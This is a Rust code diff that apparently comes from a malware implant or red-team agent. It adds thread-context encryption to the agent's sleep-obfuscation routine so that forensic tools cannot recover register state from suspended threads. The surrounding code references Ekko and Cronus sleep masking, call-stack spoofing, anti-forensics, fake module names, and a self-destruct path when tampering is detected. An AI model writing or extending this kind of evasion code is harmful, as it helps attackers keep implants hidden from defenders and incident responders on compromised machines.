@@ -212,6 +212,11 @@ pub struct SleepObfuscationConfig {
     /// Which sleep variant to use: `Cronus` (waitable timer) or `Ekko`
     /// (NtDelayExecution).  Defaults to `Cronus`.
     pub variant: SleepVariant,
+    /// Encrypt thread contexts (CONTEXT structs, TLS data) for all non-current
+    /// threads during sleep.  Prevents forensic tools from recovering register
+    /// state from suspended threads.  Requires `thread-ctx-encrypt` feature.
+    /// (default: true).
+    pub encrypt_thread_contexts: bool,
 }
 
 impl Default for SleepObfuscationConfig {
@@ -225,6 +230,7 @@ impl Default for SleepObfuscationConfig {
             fake_module_name: None,
             anti_forensics: true,
             variant: SleepVariant::default(),
+            encrypt_thread_contexts: true,
         }
     }
 }
@@ -1093,7 +1099,7 @@ unsafe fn restore_call_stack(_handle: StackSpoofHandle) {
 
 /// Terminate the agent process immediately when AEAD verification fails
 /// (memory tampering detected).
-unsafe fn self_destruct() -> ! {
+pub(crate) unsafe fn self_destruct() -> ! {
     log::error!("[sleep_obfuscation] AEAD verification failed — self-destructing");
 
     // Try NtTerminateProcess first (avoids IAT hooks).
@@ -1599,6 +1605,25 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // ── 3. Encrypt all regions ─────────────────────────────────────────────
     let mut snapshots: Vec<RegionSnapshot> = Vec::with_capacity(raw_regions.len());
 
+    // ── 2a. Capture and encrypt thread contexts ─────────────────────────────
+    // Thread contexts are captured AFTER region enumeration but BEFORE memory
+    // encryption, because we need the threads suspended so they don't touch
+    // the memory we're about to encrypt.
+    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
+    let mut thread_ctx_snapshots: Option<Vec<crate::thread_context_encrypt::ThreadContextSnapshot>> = None;
+    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
+    if config.encrypt_thread_contexts {
+        match unsafe { crate::thread_context_encrypt::capture_and_encrypt_thread_contexts(&key) } {
+            Ok(snapshots) => {
+                log::debug!("[sleep_obfuscation] captured {} thread contexts", snapshots.len());
+                thread_ctx_snapshots = Some(snapshots);
+            }
+            Err(e) => {
+                log::warn!("[sleep_obfuscation] thread context capture failed: {e:#}, continuing without");
+            }
+        }
+    }
+
     for (base, size, orig_prot) in &raw_regions {
         let base = *base;
         let size = *size;
@@ -1810,6 +1835,24 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // rebuild the database if any are stale.
     #[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
     crate::stack_db::revalidate_db();
+
+    // ── 8e. Decrypt and restore thread contexts ──────────────────────────
+    // Thread contexts are restored AFTER memory region decryption but BEFORE
+    // stack decryption.  This ensures the threads' memory is already decrypted
+    // when they resume, preventing crashes from accessing encrypted pages.
+    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
+    if let Some(ref mut ctx_snaps) = thread_ctx_snapshots {
+        match unsafe { crate::thread_context_encrypt::decrypt_and_restore_thread_contexts(&key, ctx_snaps) } {
+            Ok(()) => {
+                log::debug!("[sleep_obfuscation] thread contexts restored successfully");
+            }
+            Err(e) => {
+                log::error!("[sleep_obfuscation] thread context restore failed: {e:#}");
+                // Non-fatal: threads may have corrupted state but we continue
+                // to avoid losing the agent entirely.
+            }
+        }
+    }
 
     // ── 9. Decrypt stack ───────────────────────────────────────────────────
     if let Some((s_base, s_size, s_orig_prot, s_nonce, s_tag)) = stack_info {
